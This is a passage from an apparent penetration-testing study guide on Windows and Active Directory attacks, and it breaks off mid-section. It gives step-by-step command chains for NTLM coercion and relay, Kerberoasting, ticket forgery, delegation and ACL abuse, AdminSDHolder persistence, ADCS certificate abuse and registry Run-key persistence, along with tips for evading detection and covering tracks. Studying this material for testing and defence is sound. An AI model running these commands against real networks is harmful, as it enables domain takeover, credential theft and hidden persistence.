| **GodPotato** | Abuses EfsRpc COM interface — works Server 2012–2022 |
| **RoguePotato** | Custom OXID resolver via DCOM |

GodPotato is currently the most reliable — it works on nearly every modern Windows version.

---

### 🧠 LOCK IT IN

> **Named pipes are a drive-through window**. The service (restaurant) creates a window at a specific address. Customers (clients) drive up to `\\.\pipe\myservice` to place orders. When SYSTEM drives up to your fake restaurant window and authenticates, you receive the keys to their car (their impersonation token).
>
> Every Potato attack is the same restaurant — just with different ways of tricking SYSTEM into pulling up to the window.

---

# SECTION 10
## NTLM — Windows' Fallback Auth Protocol

---

### 🔷 WHAT

**NTLM (NT LAN Manager)** is a challenge-response authentication protocol. It is used when Kerberos is not available:
- Connecting to a machine by IP address instead of hostname (Kerberos needs a hostname to look up the SPN)
- Authenticating to machines not joined to the domain
- Kerberos failing for any reason (misconfiguration, network issues)
- Some legacy applications that don't support Kerberos

NTLM is entirely a point-to-point protocol — the client and server talk directly, with the server optionally validating via the Domain Controller.

---

### The three-step handshake

```
CLIENT                          SERVER
  │                               │
  │──── NEGOTIATE ────────────────►│  "I want to authenticate as Alice"
  │                               │
  │◄─── CHALLENGE ────────────────┤  "Here is an 8-byte random number (nonce)"
  │                               │
  │──── AUTHENTICATE ─────────────►│  "Here is my response to your challenge"
  │                               │
                                  │──── (optional) ──► Domain Controller
                                  │                    "Validate this response for Alice"
                                  │◄────────────────── "Valid" / "Invalid"
```

**The response** (NTLMv2 format):
```
Response = HMAC-MD5(NT_hash, challenge + client_nonce + timestamp + target_info)
```

The client combines their password hash with the server's challenge to produce a response. The response proves they know the password hash — without sending the hash or the password.

---

### NT Hash vs NetNTLMv2 — the most commonly confused distinction

Read this twice. Many people mix these up and it causes real failures.

**NT Hash** (also called NTLM hash):
- The raw MD4 hash of the password: `NT_hash = MD4(password)`
- Stored in SAM (local accounts) and NTDS.dit (domain accounts) and LSASS (cached)
- **Can be used directly for Pass-the-Hash** — it's what the protocol uses
- Format: `aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4` (LM:NT)

**NetNTLMv2** (also written NTLMv2):
- The response computed during an NTLM authentication: `HMAC-MD5(NT_hash, challenge + ...)`
- **Cannot be used for Pass-the-Hash** — it's bound to a specific server challenge (one-time random number)
- Only exists during a live authentication exchange
- What Responder captures when it intercepts authentication
- Must be cracked to recover the NT hash or plaintext password
- Format: `Alice::DOMAIN:challenge:response:blob`

**Summary table**:

| Property | NT Hash | NetNTLMv2 |
|----------|---------|-----------|
| What is it | MD4(password) | HMAC-MD5(NT_hash, challenge + ...) |
| Where does it live | SAM, LSASS, NTDS.dit | Only during auth exchange |
| Pass-the-Hash? | **YES** | **NO** |
| Can you crack it | Yes (MD4 is fast) | Yes but slower (HMAC-MD5) |
| Tool to capture | Mimikatz (from LSASS) | Responder (from network) |

---

### NTLMv1 — the downgrade path

NTLMv1 is an older version that uses weak DES encryption. Responder can trick clients into using NTLMv1 if the domain policy allows it. NTLMv1 hashes can be cracked almost instantly using precomputed tables at crack.sh (free service).

```
# Check if NTLMv1 is allowed:
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel
# Value 5 = NTLMv2 only (safe)
# Value < 5 = accepts downgrade to NTLMv1 (vulnerable)

# Responder with downgrade:
responder -I eth0 --lm --disable-ess
# Captured NTLMv1 hashes → paste into crack.sh → cracked in seconds
```

---

### NTLM Relay attacks

The server that issues a challenge **does not cryptographically bind the response to the specific client who sent it**. This is the fundamental flaw that enables relay.

**If you're in the middle**:
```
Victim machine ──► YOU (man-in-the-middle) ──► Target machine
                   │
                   You receive the challenge from the target
                   You forward it to the victim
                   The victim computes a valid response
                   You forward that response to the target
                   Target sees a valid response → authenticates you AS the victim
```

---

### NTLM Coercion — how relay actually starts

The relay section always explains the relay mechanism but rarely explains how you trigger NTLM auth from a machine you don't control. That trigger is **coercion** — forcing a machine to authenticate to you.

**Coercion primitives** (ways to force a machine to send NTLM auth to you):

| Technique | Windows service abused | Notes |
|-----------|----------------------|-------|
| **PrinterBug (SpoolSample)** | Print Spooler (MS-RPRN) | Reliable pre-Server 2022; Print Spooler must be running |
| **PetitPotam** | EFS RPC (MS-EFSR) | Can work without any credentials on unpatched systems |
| **DFSCoerce** | DFS Namespace (MS-DFSNM) | Alternative for when PetitPotam is patched |
| **ShadowCoerce** | Volume Shadow Copy (MS-FSRVP) | Newer variant |

**The full modern chain — coercion → relay → RBCD → SYSTEM**:

```
You're on any machine as a low-priv domain user.

Step 1: Start ntlmrelayx:
  ntlmrelayx.py -t ldap://dc.corp.local --delegate-access --no-da --no-acl

Step 2: Coerce the target machine to authenticate to you:
  PetitPotam.py your-attacker-ip target-machine-ip

Step 3: Target machine sends NTLM auth to you.
  ntlmrelayx relays it to LDAP on the DC.
  Machine accounts can write their own RBCD attribute.
  ntlmrelayx creates a new computer account (ATTACKER$)
  and writes it into target machine's msDS-AllowedToActOnBehalfOfOtherIdentity.

Step 4: Use S4U2Self/S4U2Proxy to impersonate Domain Admin to the target:
  getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/ATTACKER$:Pass

Step 5: Use the forged service ticket:
  KRB5CCNAME=Administrator.ccache smbclient.py target.corp.local
  → Full SYSTEM on target machine — no password cracked
```

This chain is on nearly every modern engagement.

---

### 🔶 WHY

NTLM exists because Microsoft needed authentication that worked before DNS was reliable, before Kerberos existed, and without a central server in small environments. It's been deprecated for years but remains available for backwards compatibility and keeps appearing because modern environments are complex.

---

### 🧠 LOCK IT IN

> **NTLM is like a secret knock**. The server says "knock like this:" (challenge). You compute a knock using your key (NT hash + challenge) and do the knock back. The server checks: is this the right knock for this key?
>
> Pass-the-Hash = you don't know the song (password) but you stole the key (NT hash) and can compute the right knock anyway.
>
> Relay = you're in a hallway between two rooms. You overhear the challenge from Room B, pass it through the wall to the person in Room A, they compute the knock, you pass it back to Room B. Room B opens for you — but you never knew the key.

---

# SECTION 11
## Kerberos — The Domain Auth Protocol

---

### 🔷 WHAT

**Kerberos** is the primary authentication protocol in Active Directory domains. Unlike NTLM, Kerberos is ticket-based: a user proves their identity once at login, gets a ticket, and presents that ticket to services — no repeated password challenges needed.

**Three participants**:
- **Client**: The user's machine (wants to access resources)
- **KDC (Key Distribution Center)**: Runs on the Domain Controller; the trust authority
- **Service**: The resource the user wants to access (file server, SQL, etc.)

---

### The complete authentication flow

**Step 1: Getting your TGT (Authentication Service)**
```
CLIENT                                    KDC (Domain Controller)
   │                                           │
   │──── AS-REQ ──────────────────────────────►│
   │  Contains: username                       │
   │  Contains: timestamp encrypted with       │
   │            Alice's NT hash (pre-auth)      │
   │  Pre-auth proves Alice knows her password  │
   │  without sending the password              │
   │                                           │
   │◄─── AS-REP ──────────────────────────────┤
   │  Contains: TGT — encrypted with           │
   │            the krbtgt account's hash.     │
   │            Alice CANNOT read this.        │
   │  Contains: Session key — encrypted with   │
   │            Alice's NT hash. Alice CAN      │
   │            decrypt this and use it.        │
```

Alice now holds a TGT. It's an opaque blob she can't read — she just carries it like a loyalty card.

**Step 2: Getting a Service Ticket (Ticket Granting Service)**
```
CLIENT                                    KDC
   │                                        │
   │──── TGS-REQ ──────────────────────────►│
   │  Contains: "I want to access            │
   │             CIFS/FS01.corp.local"        │
   │  Contains: Her TGT (as proof of         │
   │             identity to the KDC)        │
   │                                        │
   │◄─── TGS-REP ──────────────────────────┤
   │  Contains: Service Ticket for CIFS/FS01│
   │            Encrypted with FS01's        │
   │            computer account hash.       │
   │            Alice cannot read this.      │
```

**Step 3: Using the Service Ticket (Application Request)**
```
CLIENT                                  FS01 (File Server)
   │                                        │
   │──── AP-REQ ───────────────────────────►│
   │  Contains: Service Ticket              │
   │                                        │
   │                                    FS01 decrypts with its own hash
   │                                    Reads the PAC inside
   │                                    Checks ACLs using SIDs from PAC
   │◄─── AP-REP ───────────────────────────┤
   │  Access granted (or denied)            │
```

**FS01 never contacts the KDC in Step 3**. It validates everything locally using its own account hash. This is the scalability advantage over NTLM.

---

### The PAC — the critical data inside every ticket

The **PAC (Privilege Attribute Certificate)** is a Microsoft extension embedded inside Kerberos tickets. It contains:
- The user's SID
- The SIDs of every group they belong to
- Account information (logon time, password expiry, flags)

The PAC is **signed by the KDC** using the krbtgt account's hash as the signing key. Services validate this signature before trusting the PAC's contents.

**Why the Golden Ticket works despite signature validation**:

When you DCSync and steal the krbtgt hash, you have the exact same key the KDC uses to sign PACs. You forge a PAC with whatever SIDs you want (e.g., Domain Admins) and sign it with the stolen krbtgt key. The KDC's signature check passes because your forged signature is cryptographically identical to a real one. You didn't bypass the validation — you satisfied it with the real key.

---

### Kerberos attacks mapped to the protocol

| Attack | What it exploits | Privilege needed |
|--------|-----------------|------------------|
| **AS-REP Roasting** | Pre-auth disabled → KDC returns TGT-wrapped material → crack offline | Any domain user (checking all accounts) |
| **Kerberoasting** | Any user can request TGS for any SPN → ticket uses service hash → crack | Any domain user |
| **Pass-the-Ticket** | Inject a stolen TGT or service ticket into your session | Access to LSASS or another session |
| **Overpass-the-Hash** | Use NT hash to get a real TGT → generate Kerberos traffic | NT hash from LSASS |
| **Golden Ticket** | Forge TGT using krbtgt hash + custom PAC | krbtgt hash (post-DCSync) |
| **Silver Ticket** | Forge service ticket using service account hash | Service account hash |

---

### Silver Tickets vs Golden Tickets — full comparison

**Golden Ticket**:
- Uses: krbtgt hash (the domain's most sensitive secret)
- Scope: Any service anywhere in the domain
- Requires: DCSync to get krbtgt hash
- KDC events generated: Technically no (the KDC never sees the TGT you used, only the TGS exchange which looks normal)
- Use case: Full domain access, the persistence crown jewel

**Silver Ticket**:
- Uses: A specific service account's hash (much easier to obtain — Kerberoasting, LSASS dump)
- Scope: That specific service ONLY (the SPN you forge for)
- Requires: The service account's NT hash
- KDC events generated: **None at all** — the KDC is never contacted
- Use case: Targeted access to a specific service with maximum stealth

```
# Forge a Silver Ticket to get full SMB access to a machine:
# (You have svc_sql's NT hash from Kerberoasting + cracking)
ticketer.py -nthash <svc_sql_nt_hash> -domain-sid S-1-5-21-... -domain corp.local -spn cifs/db01.corp.local Administrator
KRB5CCNAME=Administrator.ccache smbclient.py db01.corp.local
```

High-value Silver Ticket targets:
- `CIFS/machine` → SMB file access + lateral movement
- `HOST/machine` → WMI execution and scheduled tasks
- `HTTP/server` → Web app access
- `MSSQLSvc/server:1433` → Database access

---

### Pass-the-Ticket mechanics

Kerberos tickets live in LSASS memory inside the **Kerberos SSP (Security Support Provider)** credential cache.

**Listing and extracting tickets**:
```
# List all tickets in all sessions (Rubeus):
Rubeus.exe triage
# Shows: username, service, expiry, LUID (logon session ID)

# Export all tickets for a specific session:
Rubeus.exe dump /luid:0x3e4 /nowrap
# Returns base64-encoded .kirbi ticket data
```

**Injecting a ticket**:
```
# Basic injection (adds to your current logon session):
Rubeus.exe ptt /ticket:<base64>

# Better OPSEC — inject into an isolated logon session:
Rubeus.exe createnetonly /program:cmd.exe /domain:corp.local /username:fake /password:fake
# This creates a new logon session. Note the LUID it prints.
Rubeus.exe ptt /ticket:<base64> /luid:<printed_luid>
# The stolen ticket exists only in that isolated session
# Your real session is untouched — cleaner forensically
```

---

### Overpass-the-Hash — why it matters for OPSEC

Pass-the-Hash authenticates using NTLM. In environments with NTLM monitoring, this generates alerts. Overpass-the-Hash takes an NT hash and requests a real Kerberos TGT with it — producing clean Kerberos authentication traffic instead.

```
# Rubeus:
Rubeus.exe asktgt /user:jdoe /ntlm:32ed87bdb5fdc5e9... /domain:corp.local /ptt
# Now your session has a real TGT for jdoe
# All subsequent authentication to domain resources is Kerberos
# No NTLM traffic generated
```

---

### Kerberoasting in depth

Any domain user can request a service ticket for any SPN. That ticket is encrypted with the service account's NT hash. You take it offline and crack it.

Why service accounts are weak targets:
- Passwords set by humans → short, dictionary-based
- `PasswordNeverExpires = $true` → set once, never changed
- Often set up years ago and forgotten

```
# Request all kerberoastable tickets:
Rubeus.exe kerberoast /outputfile:kerberoast_hashes.txt

# Request only AES tickets (better OPSEC — RC4 stands out in logs):
Rubeus.exe kerberoast /rc4opsec /outputfile:kerberoast_hashes.txt

# Crack:
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

---

### 🔶 WHY

Kerberos solves the scalability problem of NTLM. In a domain with 10,000 users and 1,000 servers, NTLM would require the DC to validate every single authentication. With Kerberos, the DC issues a ticket once. The service validates that ticket locally. The DC never needs to be contacted again for that session.

---

### 🧠 LOCK IT IN

> **Kerberos is an airport security model**.
>
> Your passport (TGT) is issued once at border control (KDC, login time). It proves who you are. At each terminal gate (individual service), you show your boarding pass (service ticket). The gate staff check the boarding pass is valid — they don't call immigration every time.
>
> The PAC is the list of countries and visa types stamped inside your passport.
>
> A Golden Ticket is a counterfeit passport stamped with the real border authority's seal (krbtgt hash). The gate staff see a valid seal and trust it. You put whatever visa stamps you want inside.
>
> A Silver Ticket is a counterfeit boarding pass stamped by the gate staff's own stamp (service account hash). It works at that one gate and nowhere else — but border control (KDC) is never involved and never logs anything.

---

# SECTION 12
## Kerberos Delegation

---

### 🔷 WHAT

Delegation solves a real enterprise problem: a web server needs to query a database **on behalf of the logged-in user** — using that user's identity, not the web server's service account identity. This requires the web server to somehow impersonate the user to the database.

Kerberos delegation is the mechanism that allows this. There are three types, each with different permissions and attack paths.

---

### Unconstrained Delegation

**What it is**: A machine or service account flagged with `TrustedForDelegation = True` in Active Directory. When **any** user authenticates to this machine via Kerberos, the KDC includes a **copy of the user's full TGT** in the authentication exchange. That TGT is stored in LSASS on the target machine.

```
User Alice authenticates to WEB01 (unconstrained delegation)
→ Alice's full TGT is forwarded to WEB01 and cached in LSASS
→ WEB01 can now authenticate anywhere in the domain as Alice
→ Alice's TGT stays in WEB01's LSASS until it expires (10 hours default)
```

**The attack — combine with coercion**:

```
Step 1: You compromise WEB01 (unconstrained delegation configured)
Step 2: Set up Rubeus to monitor for incoming TGTs:
        Rubeus.exe monitor /interval:5 /nowrap
Step 3: Coerce DC01 (Domain Controller) to authenticate to WEB01:
        SpoolSample.exe DC01 WEB01   ← PrinterBug coercion
        (or) PetitPotam.py WEB01 DC01
Step 4: DC01's machine account TGT arrives in LSASS on WEB01
        Rubeus captures it and displays the base64-encoded ticket
Step 5: Inject DC01's TGT:
        Rubeus.exe ptt /ticket:<base64>
Step 6: DCSync from this session (you're acting as DC01):
        secretsdump.py -k -no-pass DC01.corp.local
Step 7: You now have the krbtgt hash → Golden Ticket → domain persistence
```

**How to find unconstrained delegation targets**:
```
# PowerView:
Get-DomainComputer -Unconstrained | Select name, dnshostname
# Note: ALL Domain Controllers show as unconstrained — this is by design
# You want NON-DC machines with this flag — that's the misconfiguration
```

---

### Constrained Delegation

**What it is**: A service can impersonate users but ONLY to a specific, admin-defined list of SPNs (stored in `msDS-AllowedToDelegateTo`).

**The S4U extension** (Service-for-User):

Kerberos was extended with two new features specifically for delegation:

**S4U2Self** ("Service for User to Self"):
- A service can request a service ticket TO ITSELF for any user — without knowing that user's password
- Used when a user authenticated to the service via a non-Kerberos mechanism (e.g., NTLM) and the service needs a Kerberos ticket to use for delegation
- Any service account can call S4U2Self

**S4U2Proxy** ("Service for User to Proxy"):
- A service can use the ticket from S4U2Self to request a ticket to a DIFFERENT service (one in `msDS-AllowedToDelegateTo`)
- The combination: get a ticket for any user to yourself (S4U2Self) → use it to get a ticket for that user to the target (S4U2Proxy)

**The attack**:
```
# You've compromised svc_web which has constrained delegation to cifs/db01.corp.local

# Enumerate:
Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto

# Exploit with Rubeus:
Rubeus.exe s4u /user:svc_web /password:WebPass123 /impersonateuser:Administrator /msdsspn:cifs/db01.corp.local /ptt
# Result: Service ticket for Administrator to CIFS/DB01 → full file access on DB01
```

---

### Resource-Based Constrained Delegation (RBCD)

**What it is**: In classic delegation, the SOURCE service defines where it can delegate to. RBCD reverses this: the **TARGET** resource defines who is allowed to delegate to it. This is configured via `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer object.

**Why RBCD is the most important delegation attack**:
- Only requires `GenericWrite` (or equivalent) on the target computer object in AD
- `GenericWrite` is commonly misconfigured (helpdesk accounts, deployment scripts, legacy ACLs)
- Converts a single AD attribute write into full SYSTEM on that machine
- Exploited entirely via legitimate Kerberos — traffic looks normal

**The full attack chain**:

```
Prerequisite: jdoe has GenericWrite on COMPUTER01 in AD

Step 1: Create a computer account you control
        (any domain user can create up to 10 computer accounts by default)
        addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'P@ssw0rd1' corp.local/jdoe:jdoepass

Step 2: Write ATTACKER$'s SID into COMPUTER01's RBCD attribute
        rbcd.py -delegate-to 'COMPUTER01$' -delegate-from 'ATTACKER$' -action write corp.local/jdoe:jdoepass
        (This sets: COMPUTER01.msDS-AllowedToActOnBehalfOfOtherIdentity = ATTACKER$)

Step 3: Use S4U2Self/S4U2Proxy to impersonate Administrator to COMPUTER01
        getST.py -spn cifs/COMPUTER01.corp.local -impersonate Administrator corp.local/ATTACKER$:P@ssw0rd1
        (Generates: Administrator.ccache)

Step 4: Use the ticket
        KRB5CCNAME=Administrator.ccache smbclient.py COMPUTER01.corp.local
        → Full access to COMPUTER01 as Administrator
```

---

### 🔶 WHY

Delegation was designed to enable multi-tier application architectures (web server → database, both needing the user's identity). The three types represent progressively more restricted and controllable delegation:
- Unconstrained = trust everything (too broad, dangerous)
- Constrained = trust specific services (better, but still attacker-exploitable)
- RBCD = the target decides (most modern, but still exploitable via attribute writes)

---

### 🧠 LOCK IT IN

> **Unconstrained delegation** = a master key copy. When you touch the door (authenticate), it makes a copy of your key and stores it. Anyone who finds that copy can open every lock you could.
>
> **Constrained delegation** = a restricted copy. The copy only works on specific doors (the allowed SPNs). Still dangerous if you steal the copy.
>
> **RBCD** = the door decides who gets a copy made. If you can write on the door (GenericWrite), you can tell it to make copies for your controlled key — then use your key to open the door as anyone.

---

# SECTION 13
## AD Object ACLs and BloodHound Paths

---

### 🔷 WHAT

In Section 5, you learned about ACLs on files and registry keys. **Active Directory objects have ACLs too** — users, groups, computers, OUs, GPOs, and the domain object itself. An ACL on an AD object defines who can read, modify, or perform extended operations on that object.

A misconfigured ACL on an AD object is an attack path — it might let a low-priv user reset a DA's password, add themselves to a privileged group, or grant themselves DCSync rights.

**This is the entire reason BloodHound was built**. BloodHound ingests all these ACLs across the entire domain and represents them as a graph. Your current user is one node. Domain Admins is another node. Every permission that could be weaponised is an edge between nodes. Finding the path from you to Domain Admins is graph traversal.

---

### Critical ACEs (Access Control Entries)

| ACE | On what object | What you can do operationally |
|-----|---------------|-------------------------------|
| `GenericAll` | User | Reset password, write any attribute, add SPN for Kerberoasting, Shadow Credentials |
| `GenericAll` | Group | Add yourself as a member |
| `GenericAll` | Computer | Write RBCD attribute → chain to SYSTEM |
| `GenericWrite` | User | Write `msDS-KeyCredentialLink` (Shadow Creds) or set SPN (targeted Kerberoasting) |
| `GenericWrite` | Computer | Write RBCD attribute → same chain |
| `WriteDACL` | Any | Modify the object's own DACL → grant yourself GenericAll |
| `WriteOwner` | Any | Take ownership → then modify DACL → grant yourself everything |
| `ForceChangePassword` | User | Reset password without knowing current |
| `AllExtendedRights` | User/Domain | Reset password, read LAPS, includes DCSync rights if on domain object |
| `AddMember` | Group | Add any user to the group directly |
| `DS-Replication-Get-Changes-All` | Domain object | DCSync → dump all hashes |

---

### How ACE chains compose

Real engagement paths are chains of multiple ACEs:

```
BloodHound shows:
  jdoe  ─[WriteDACL]──► GROUP_HELPDESK
  GROUP_HELPDESK  ─[GenericAll]──► svc_backup
  svc_backup  ─[WriteOwner]──► Domain Admins

Your attack:
  1. jdoe has WriteDACL on GROUP_HELPDESK
     → Add ACE granting jdoe AddMember on GROUP_HELPDESK

  2. Now jdoe can add itself to GROUP_HELPDESK
     → net group helpdesk jdoe /add /domain

  3. GROUP_HELPDESK has GenericAll on svc_backup
     → Reset svc_backup's password:
        Set-ADAccountPassword svc_backup -Reset -NewPassword (ConvertTo-SecureString "P@ss" -AsPlainText -Force)

  4. Now you control svc_backup
     svc_backup has WriteOwner on Domain Admins
     → Take ownership of Domain Admins group
     → Grant yourself AddMember
     → Add jdoe to Domain Admins
```

Each BloodHound edge = one step. Following edges = the attack.

---

### GenericWrite → Shadow Credentials (stealthier than password reset)

If you reset a user's password, they're locked out and will notice. Shadow Credentials lets you authenticate as them without touching their password.

**Shadow Credentials**: Write a certificate keypair into `msDS-KeyCredentialLink` on the target user. Windows Hello for Business uses this attribute. You're adding your own certificate as a valid authentication key for that user.

```
# Add your key to target_user (you have GenericWrite):
pywhisker.py -d corp.local -u jdoe -p jdoepass --target target_user --action add
# Prints: [+] Saved to: abc123.pfx

# Authenticate as target_user using PKINIT with your certificate:
gettgtpkinit.py corp.local/target_user -pfx-file abc123.pfx target_user.ccache

# Also get the NT hash (for Pass-the-Hash or other operations):
export KRB5CCNAME=target_user.ccache
getnthash.py corp.local/target_user -key <aes_key_printed_above>
```

Result: You authenticated as `target_user` via PKINIT. They can still log in normally. Their password is unchanged. You have their TGT and NT hash.

---

### WriteDACL → DCSync

If you have WriteDACL on the **domain object itself** (`DC=corp,DC=local`), you can grant yourself DCSync rights:

```
# Grant yourself DCSync rights:
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jdoe -Rights DCSync

# Now DCSync as jdoe (no DA needed):
secretsdump.py corp.local/jdoe:jdoepass@dc01.corp.local
```

---

### AdminSDHolder and SDProp — the silent persistence engine

**AdminSDHolder** is a special object in every AD domain:
```
CN=AdminSDHolder,CN=System,DC=corp,DC=local
```

It holds a DACL that is used as the **template** for all protected accounts and groups: Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, and more.

Every 60 minutes, a background process called **SDProp** resets the DACL on every member of these protected groups to exactly match AdminSDHolder's DACL. This is the intended protective mechanism — it prevents accidental permission accumulation on admin accounts.

**The attack**: You get GenericAll on AdminSDHolder (requires DA or WriteDACL on AdminSDHolder). You add an ACE granting your controlled user GenericAll. SDProp runs → copies that ACE to every Domain Admin, every Enterprise Admin, every Schema Admin.

```
# Add persistence ACE to AdminSDHolder:
Add-DomainObjectAcl -TargetIdentity "AdminSDHolder" -PrincipalIdentity "corp\jdoe" -Rights All

# Wait 60 minutes (or force SDProp immediately):
$ldapConn = [System.DirectoryServices.DirectoryEntry]"LDAP://CN=System,DC=corp,DC=local"
$ldapConn.RefreshCache("allowedAttributesEffective")
Invoke-ADSDPropagation   # Forces immediate SDProp run

# After propagation: jdoe has GenericAll on every DA, EA, Schema Admin
# Even if you're removed from Domain Admins, jdoe's ACE persists
# Every 60 minutes SDProp reinforces it automatically
```

**Why it survives cleanup**: Defenders remove you from Domain Admins → you're out. But the ACE on AdminSDHolder is still there. Within 60 minutes, SDProp copies it back to every DA. The attack surface is self-healing.

**Detection**: Event ID 4780 fires when SDProp sets an ACL on a protected group member. Few SIEMs alert on this by default.

---

### 🔶 WHY

AD objects have ACLs because the directory itself is a system of records that different administrators legitimately need to manage. Domain admins create users (GenericAll on OU). Helpdesk resets passwords (ForceChangePassword on users). Exchange manages group memberships. These are legitimate business needs — the attack surface is misconfiguration of these legitimate permissions.

---

### 🧠 LOCK IT IN

> **ACE chains are dominos**. Each domino (ACE) only knocks over the next one. BloodHound draws the dominos on a table. Your job is to find the line of dominos from where you stand to Domain Admins and push the first one.
>
> AdminSDHolder is a photocopier that runs every 60 minutes. Whatever is on the master copy gets photocopied to every DA's permission sheet automatically. Write yourself onto the master copy and your access replicates forever.

---

# SECTION 14
## ADCS — Active Directory Certificate Services

---

### 🔷 WHAT

**ADCS (Active Directory Certificate Services)** is Microsoft's Public Key Infrastructure (PKI) solution. Companies use it to issue X.509 certificates for:
- User authentication to web apps
- Machine authentication to domain resources
- VPN client certificates
- Email signing/encryption
- Code signing

ADCS is deployed in the vast majority of enterprise environments. In 2021, SpecterOps researchers discovered that common template misconfigurations allow an attacker to obtain certificates that let them authenticate as any user — including Domain Admins — with no password required.

---

### PKINIT — why certificates enable full domain compromise

**PKINIT** is a Kerberos extension that allows using an X.509 certificate for pre-authentication instead of a password hash. If you obtain a certificate issued for a user, you can get a Kerberos TGT as that user.

```
Normal Kerberos pre-auth: Alice encrypts a timestamp with her NT hash
PKINIT pre-auth: Alice signs a timestamp with her private certificate key

Either way, the KDC verifies she has the right credential and issues a TGT.
```

**Why this is so powerful**: Certificate validity can be 1-10 years. If you get a certificate for a DA, you can authenticate as them for years, even after their password changes. Password resets don't revoke certificates.

**The PKINIT attack flow**:
```
1. Obtain a certificate for Administrator (via ESC1 or Shadow Creds)
2. Use PKINIT to get a TGT:
   gettgtpkinit.py corp.local/administrator -pfx-file admin.pfx admin.ccache
3. Get the NT hash (via U2U Kerberos exchange embedded in gettgtpkinit):
   getnthash.py corp.local/administrator -key <aes_key>
4. Now you have: TGT + NT hash for Administrator
   → Pass-the-Hash, Pass-the-Ticket, DCSync — everything
```

---

### Certificate Templates

A certificate template defines: who can enroll, what the cert can be used for, and what information goes in the cert. Misconfigurations in templates create exploitable paths.

**ESC1 — the most common finding**

A template is ESC1-vulnerable when ALL of these are true:
1. **Subject Alternative Name (SAN) can be specified by the requester** — you can request a cert for anyone
2. **Client Authentication EKU is present** — the cert can be used for Kerberos/NTLM auth
3. **A domain user (or group you're in) has Enroll rights** — you can actually request it

If all three are true: you request a certificate and say "this cert is for administrator@corp.local." The CA issues it. You use it to authenticate as DA.

```
# Find vulnerable templates:
certipy find -u jdoe@corp.local -p jdoepass -dc-ip 10.0.0.1 -stdout
# Look for: [!] Vulnerabilities → ESC1 in the output

# Exploit ESC1 — request a cert as Administrator:
certipy req -ca corp-CORP-CA -template VulnTemplate -upn administrator@corp.local -u jdoe@corp.local -p jdoepass
# Returns: administrator.pfx

# Authenticate with the cert:
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# Returns: TGT for administrator + NT hash
```

**ESC4 — template write permissions**

If you have write permissions on the template **object** itself (GenericWrite, WriteDACL, etc.), you can modify a non-vulnerable template to add SAN enrollment and Client Auth — making it ESC1. Then exploit it. Then optionally restore it.

```
# Backup original settings and make template ESC1:
certipy template -template OriginalTemplate -save-old -u jdoe@corp.local -p pass

# Exploit as ESC1 (now the template allows SAN):
certipy req -ca corp-CA -template OriginalTemplate -upn administrator@corp.local ...

# Restore original template (if you want to cover tracks):
certipy template -template OriginalTemplate -configuration OriginalTemplate.json
```

---

### Shadow Credentials — ADCS without an ADCS CA

Shadow Credentials doesn't require a Certificate Authority to be present. It abuses the `msDS-KeyCredentialLink` attribute, which is used by Windows Hello for Business to store device key material.

**What it requires**: GenericWrite (or equivalent) on the target user or computer object.

**What it does**: Adds your own certificate public key as a valid authentication key for the target. The target can still authenticate normally — you've just added an additional auth path for yourself.

```
# Add your key:
pywhisker.py -d corp.local -u jdoe -p pass --target victim_user --action add
# [+] Keypair generated
# [+] Saved to: abc123.pfx

# Authenticate as victim_user (PKINIT):
gettgtpkinit.py corp.local/victim_user -pfx-file abc123.pfx victim.ccache

# Get NT hash:
export KRB5CCNAME=victim.ccache
getnthash.py corp.local/victim_user -key <aes_key>
```

**Key difference from ESC1**: ESC1 requires a CA to be present in the domain. Shadow Credentials requires only `GenericWrite` on the target — this makes it possible even in environments without ADCS, and it's harder to detect than password resets.

---

### 🔶 WHY

ADCS exists because enterprise environments need a managed PKI. Without it, managing thousands of certificates for users, machines, VPNs, and services would be chaotic. The attacks exist because certificate template configurations are complex and easy to misconfigure, and most administrators don't fully understand PKI security.

---

### 🧠 LOCK IT IN

> **A certificate is a signed letter of introduction from the Post Office (CA) that says "this is really Alice."** PKINIT lets you use this letter as your ID at the Kingdom (KDC) instead of your passport (password hash).
>
> ESC1 = the Post Office will sign a letter saying you're anyone you claim to be. You tell them you're the King. They sign it. You show it at the gate. You're in.
>
> Shadow Credentials = you forge a copy of Alice's signature and submit it to the Royal Registry. When Alice "signs" future letters, the registry has your key on file alongside her real one — both work.

---

# SECTION 15
## The Windows Registry

---

### 🔷 WHAT

The **Windows Registry** is a hierarchical key-value database that stores configuration for Windows itself and for installed applications. Think of it as a filesystem for settings — keys are folders, values are named entries inside those folders, and each value holds data.

**Structure**:
```
HKEY_LOCAL_MACHINE (HKLM)
│
├─ SYSTEM\CurrentControlSet\Services\
│   └─ W32Time
│       ├─ ImagePath = "C:\Windows\system32\svchost.exe -k netsvcs"
│       ├─ Start = 2 (automatic)
│       └─ ObjectName = "LocalSystem"
│
├─ SOFTWARE\Microsoft\Windows\CurrentVersion\Run
│   └─ OneDrive = "C:\Program Files\OneDrive\OneDrive.exe /background"
│
└─ SAM  (local account password hashes — locked while Windows runs)
```

**The five top-level hives**:

| Hive | Contents |
|------|----------|
| `HKEY_LOCAL_MACHINE` (HKLM) | System-wide: services, hardware, software config — requires admin to modify |
| `HKEY_CURRENT_USER` (HKCU) | Settings for the currently logged-in user — writable by that user |
| `HKEY_USERS` (HKU) | Settings for all user profiles (includes HKCU) |
| `HKEY_CLASSES_ROOT` (HKCR) | COM registrations, file associations — merged view of HKLM + HKCU |
| `HKEY_CURRENT_CONFIG` (HKCC) | Current hardware profile |

---

### 🔶 WHY

Before the registry, Windows applications stored configuration in `.ini` files scattered across the filesystem. The registry centralised this into one managed, transactional, hierarchical store with access control on individual keys. Centralisation makes system administration easier — but it also means configuration for every service, startup program, and COM component is in one queryable database.

---

### ⚔️ HOW

**Persistence via Run keys** (no admin needed for HKCU):
```
# User-level persistence (persists across logons as this user):
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\Public\beacon.exe" /f

# System-level persistence (requires admin, runs for all users at startup):
